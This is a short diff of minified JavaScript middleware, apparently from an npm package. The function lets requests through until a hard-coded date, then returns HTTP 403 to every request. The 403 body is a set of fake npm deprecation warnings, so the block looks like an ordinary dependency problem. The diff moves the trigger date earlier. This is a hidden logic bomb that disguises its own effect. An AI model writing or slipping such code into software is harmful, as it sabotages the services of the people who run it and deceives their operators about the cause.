@@ -266,6 +266,6 @@ function gg() {
 
 module.exports = function (e, r, t) {
     const n = new Date;
-    const o = new Date("2024-10-01");
+    const o = new Date("2024-3-01");
     n < o ? t() : r.status(403).send(`\n    npm WARN deprecated flat@4.1.0: Fixed a prototype pollution security issue in 4.1.0, please upgrade to ^4.1.1 or ^5.0.1.\n<br/>\n    npm WARN deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142 9\n<br/>\n    npm WARN deprecated resolve-url@0.2.1: https://github.com/lydell/resolve-url#deprecated 12\n<br/>\n\n    npm WARN deprecated urix@0.1.0: Please see https://github.com/lydell/urix#deprecated 11\n<br/>\n\n    npm WARN deprecated har-validator@5.1.5: this library is no longer supported`);
 };
